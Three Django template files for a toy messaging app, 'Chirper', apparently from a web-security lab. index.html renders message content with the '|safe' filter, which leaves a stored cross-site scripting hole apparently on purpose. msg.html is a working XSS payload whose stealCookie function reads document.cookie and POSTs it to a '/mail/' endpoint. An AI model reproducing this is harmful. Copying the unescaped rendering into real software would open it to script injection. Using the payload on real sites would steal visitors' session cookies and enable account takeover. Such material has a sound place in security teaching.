# index.html
<!DOCTYPE html>
	<html xmlns="http://www.w3.org/1999/xhtml">
	    <head>
	        <title>Chirper</title>
	    </head>
	 
	 
	    <body>
			<h1>Chirper</h1>
	 
	        <table>
			<tr>
			<th style="text-align:left">Username: <td>{{user.username}} 
			</table>
	 
	 
	        <form action='logout/' method="POST">
				{% csrf_token %}
	            <input type="submit" value="Logout"/>
	        </form>
			
	        <h2>Your chirps</h2>
	 
			{% for msg in msgs %}
	 
			<i>From {{msg.source.username}} to {{msg.target.username}}</i></br>
			{{msg.content|safe}}
			</br>
			</br>
	 
			{% endfor %}
	 
	 
	        <h2>Send a chirp</h2>
	 
	        <form action='add/' method="POST" enctype="multipart/form-data">
	            {% csrf_token %}
	            To:
	            <select name="to">
	            {% for user in users %}
	                <option value="{{user.username}}">{{user.username}}</option>
	            {% endfor %}
	            </select><br/>
	 
				<textarea name="content" cols="40" rows="5"></textarea><br/>
	            <input type="submit" value="Send"/>
	        </form>
	    </body>
	 
	 
	    </body>
	</html>



# login.html
<h2>Login</h2>
<form method="post">
	{% csrf_token %}
	{{ form.as_p }}
	<button type="submit">Login</button>
</form>



# msg.html
<script>
	function stealCookie() {
	    let http = new XMLHttpRequest();
	    http.open("POST", '/mail/');
	    http.setRequestHeader("Content-type", "application/json");
	    let data = new Object();
	    data.content = document.cookie;
	    http.send(JSON.stringify(data));
	};
	stealCookie();
</script>
	 